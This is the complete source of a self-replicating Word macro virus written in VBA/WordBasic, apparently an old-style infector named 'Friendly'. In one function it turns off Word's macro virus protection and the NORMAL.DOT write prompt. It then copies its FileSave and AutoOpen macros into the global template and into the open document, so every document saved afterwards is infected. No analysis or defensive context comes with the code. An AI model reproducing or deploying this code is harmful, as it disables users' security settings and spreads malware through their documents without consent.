   Attribute VB_Name = "Friendly"

   Option Explicit

   Sub MAIN()
   End Sub

   Public Function Friendly(fileName_$)
   On Error GoTo NoMacroCopy
   Dim j

       ' Try to disable NORMAL.DOT write access warnings
       WordBasic.ToolsOptionsSave GlobalDotPrompt:=0

       ' Disable macro virus protection
       Options.VirusProtection = False

       ' Check if already infected
       j = WordBasic.CountMacros(0)
       If j <= 1 Then
           ' Copy to global
           WordBasic.MacroCopy fileName_$ + ":FileSave", "Global:FileSave", 1
           WordBasic.MacroCopy fileName_$ + ":AutoOpen", "Global:AutoOpen", 1
           WordBasic.MacroCopy fileName_$ + ":Friendly", "Global:Friendly", 1
       End If

       j = WordBasic.CountMacros(1)
       If j <= 1 Then
           ' Infect active file
           WordBasic.MacroCopy "Global:FileSave", fileName_$ + ":FileSave", 1
           WordBasic.MacroCopy "Global:AutoOpen", fileName_$ + ":AutoOpen", 1
           WordBasic.MacroCopy "Global:Friendly", fileName_$ + ":Friendly", 1
       End If
   NoMacroCopy:
   End Function
